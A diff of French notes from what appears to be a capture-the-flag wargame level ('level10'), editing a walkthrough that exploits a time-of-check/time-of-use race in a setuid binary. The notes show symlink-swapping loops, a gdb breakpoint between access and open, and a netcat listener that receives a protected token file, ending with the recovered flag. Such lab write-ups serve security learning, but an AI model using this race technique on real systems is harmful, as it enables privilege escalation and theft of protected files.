@@ -17,20 +17,20 @@ On à
 	et un prinft( %s) ou %s = hostname
 
 on essaie d'écouter le port 6969
-	netcat -z -v 192.168.1.21 4242
+	netcat -z -v 192.XXX.1.21 4242
 		Connection to 192.168.1.21 4242 port [tcp/*] succeeded!
-	netcat -z -v 192.168.1.21 6969
-		netcat: connect to 192.168.1.21 port 6969 (tcp) failed: Connection refused
+	netcat -z -v 192.XXX.1.21 6969
+		netcat: connect to 192.XXX.1.21 port 6969 (tcp) failed: Connection refused
 
 avec netstat -lntu on voit qu'il n'y à pas de port 6969
 
-./level10 /tmp/faille 192.168.1.21
-Connecting to 192.168.1.21:6969 .. Unable to connect to host 192.168.1.21
+./level10 /tmp/faille 192.XXX.1.21
+Connecting to 192.XXX.1.21:6969 .. Unable to connect to host 192.XXX.1.21
 
 netcat -l 6969 pour écouter un port, ajouter l'option K pour garder la connexion ouverte
 
-./level10 /tmp/faille 192.168.1.21
-Connecting to 192.168.1.21:6969 .. Connected!
+./level10 /tmp/faille 192.XXX.1.21
+Connecting to 192.XXX.1.21:6969 .. Connected!
 Sending file .. wrote file!
 
 
@@ -62,7 +62,7 @@ ln -sf /tmp/troll /tmp/suspect
 ln -sf /home/user/level10/token /tmp/suspect
 
 run gdb level10
-set args /tmp/suspect 192.168.1.21
+set args /tmp/suspect 192.XXX.1.21
 break open
 	access
 On run, après access et avant open, on change la source avec un lien symbolique,
@@ -73,12 +73,12 @@ Un qui tourne en boucle en modifiant les liens symbolique, et un autre qui run l
 On écoute le résultat dans netcat.
 
 while true; do ln -s /tmp/troll /tmp/suspect; ln -sf /home/user/level10/token /tmp/suspect; done
-	failed to create symbolic link `/tmp/test': File exists
+	failed to create symbolic link `/tmp/suspect': File exists
 on rajoute le flag -fs
 
 while true; do ln -sf /tmp/troll /tmp/suspect; ln -sf /home/user/level10/token /tmp/suspect; done
 
-while true; do ./level10 /tmp/suspect 192.168.1.21; done
+while true; do ./level10 /tmp/suspect 192.XXX.1.21; done
 
 on écoute sur netcat 6969, on trouve rapidement le flag: woupa2yuojeeaaed06riuj63c
 su flag10 et gettoken
